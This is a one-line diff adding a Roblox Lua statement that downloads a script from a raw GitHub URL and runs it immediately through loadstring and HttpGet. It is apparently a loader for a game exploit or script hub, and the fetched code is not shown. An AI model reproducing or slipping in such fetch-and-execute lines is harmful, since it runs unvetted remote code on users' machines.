@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Qutroxix/Service-but-backwards/refs/heads/main/source"))()
